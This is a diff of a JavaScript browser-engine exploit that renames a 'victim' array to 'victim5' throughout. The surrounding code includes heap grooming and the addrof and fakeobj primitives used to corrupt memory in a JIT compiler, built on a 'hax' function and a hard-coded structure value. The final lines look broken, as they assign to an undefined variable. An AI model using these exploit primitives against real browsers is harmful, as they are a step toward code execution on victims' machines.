@@ -65,7 +65,7 @@ function makeJITFunc() {
 //let target = [1.1,2.2,3.3];
 let objX = {objProperty: {fetchme : 0x1234}};
 let objY = {doubleProperty: []};
-let victim = [1.1, 2.2, 3.3, 4.4, 5.5];
+let victim5 = [1.1, 2.2, 3.3, 4.4, 5.5];
 let structs = [];
 for (let i = 0; i < 0x1000; i++) {
     var tmp = [1.1];
@@ -142,15 +142,15 @@ global = match;
 let backup = hax(1);
 let addrof = function (obj) {
   hax(backup);
-  victim[0] = obj;
+  victim5[0] = obj;
   hax(i2jsv(0x0108211700001000));
-  return victim[2];
+  return victim5[2];
 }
 let fakeobj = function (addr) {
   hax(i2jsv(0x0108211700001000));
-    victim[2] = addr;
+    victim5[2] = addr;
     hax(backup);
-  return victim[0];
+  return victim5[0];
 }
 var primitives;
 primitives.addrof = addrof();
